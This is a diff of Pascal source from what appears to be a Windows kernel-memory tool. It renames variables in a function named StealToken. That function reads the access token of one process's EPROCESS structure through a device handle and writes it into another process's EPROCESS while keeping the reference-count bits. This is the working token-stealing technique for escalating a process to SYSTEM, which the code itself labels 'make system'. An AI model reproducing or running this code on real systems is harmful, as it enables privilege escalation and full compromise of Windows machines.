@@ -129,18 +129,18 @@ end;
 
 function StealToken(source,destination:dword64):boolean;
 var
-Source_EProcessAddr:dword64=0;
-EProcessAddr:dword64=0;
+src_EProcessAddr:dword64=0;
+dst_EProcessAddr:dword64=0;
 device:thandle=thandle(-1);
 SourceProcessToken:dword64=0;
 CurrentProcessFastToken,CurrentProcessTokenReferenceCounter,CurrentProcessToken:dword64;
 begin
 result:=false;
-Source_EProcessAddr :=getEProcess (source);
-EProcessAddr :=getEProcess (destination);
-writeln('Src. EProcessAddr:'+inttohex(Source_EProcessAddr,8));
-writeln('Dest. EProcessAddr:'+inttohex(EProcessAddr,8));
-if EProcessAddr>0 then
+src_EProcessAddr :=getEProcess (source);
+dst_EProcessAddr :=getEProcess (destination);
+writeln('Src. EProcessAddr:'+inttohex(src_EProcessAddr,8));
+writeln('Dest. EProcessAddr:'+inttohex(dst_EProcessAddr,8));
+if dst_EProcessAddr>0 then
    begin
    if offsets.token<>0 then
      begin
@@ -149,11 +149,11 @@ if EProcessAddr>0 then
      writeln('make system');
      //clear low 4 bits of _EX_FAST_REF structure
      //https://www.geeksforgeeks.org/bitwise-operators-in-c-cpp/
-     SourceProcessToken := ReadMemoryDWORD64(Device, Source_EProcessAddr + offsets.Token) and not 15;
-     CurrentProcessFastToken := ReadMemoryDWORD64(Device, EProcessAddr+ offsets.Token);
+     SourceProcessToken := ReadMemoryDWORD64(Device, src_EProcessAddr + offsets.Token) and not 15;
+     CurrentProcessFastToken := ReadMemoryDWORD64(Device, dst_EProcessAddr+ offsets.Token);
      CurrentProcessTokenReferenceCounter := CurrentProcessFastToken and 15;
      CurrentProcessToken := CurrentProcessFastToken and not 15;
-     WriteMemoryDWORD64(Device, EProcessAddr+ dword64(offsets.Token), CurrentProcessTokenReferenceCounter or SourceProcessToken );
+     WriteMemoryDWORD64(Device, dst_EProcessAddr+ dword64(offsets.Token), CurrentProcessTokenReferenceCounter or SourceProcessToken );
      result:=true;
      closehandle(device);
      end;//if offsets.SignatureProtect<>0 then
@@ -174,9 +174,7 @@ device:thandle=thandle(-1);
          nextFlink:dword64=0;
          imagefilename:string='';
          protection:dword=0;
-         SystemProcessToken:dword64=0;
          EProcessAddr:dword64=0;
-         CurrentProcessFastToken,CurrentProcessTokenReferenceCounter,CurrentProcessToken:dword64;
 begin
 result:=false;
 //open handle
